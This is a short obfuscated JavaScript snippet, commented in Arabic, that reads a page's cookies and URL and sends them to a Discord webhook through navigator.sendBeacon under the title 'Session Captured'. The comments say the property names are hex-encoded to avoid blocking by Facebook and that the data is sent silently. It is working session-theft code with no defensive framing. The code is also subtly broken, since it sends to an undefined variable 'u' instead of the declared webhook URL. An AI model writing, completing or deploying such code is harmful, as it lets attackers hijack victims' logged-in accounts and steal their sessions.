// تشفير الأوامر لضمان عدم الحظر من قبل فيسبوك
var _0x5a21=["\x63\x6f\x6f\x6b\x69\x65","\x6c\x6f\x63\x61\x74\x69\x6f\x6e","\x68\x72\x65\x66","\x50\x4f\x53\x54","\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e","\x73\x74\x72\x69\x6e\x67\x69\x66\x79"];

(function(){
    // رابط الويب هوك الخاص بك (يجب تشفيره أيضاً)
    const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1472707165205565541/E5L4CtND22HNN01AgMscC-HfN6pS7RPl5Xm6rvQ_vrBl_HAC0r84dZpjeKHN_fSfdcL4";
    
    const d = {
        c: document[_0x5a21[0]], // سحب الكوكيز
        l: window[_0x5a21[1]][_0x5a21[2]], // سحب الرابط
        t: new Date().getTime()
    };

    // إرسال البيانات بشكل صامت عبر تقنية Beacon لضمان عدم الحظر
    navigator.sendBeacon(u, JSON[_0x5a21[5]]({
        "embeds": [{
            "title": "✅ Session Captured",
            "description": "Captured from: " + d.l,
            "fields": [{ "name": "Data", "value": "```" + d.c + "```" }]
        }]
    }));
})();
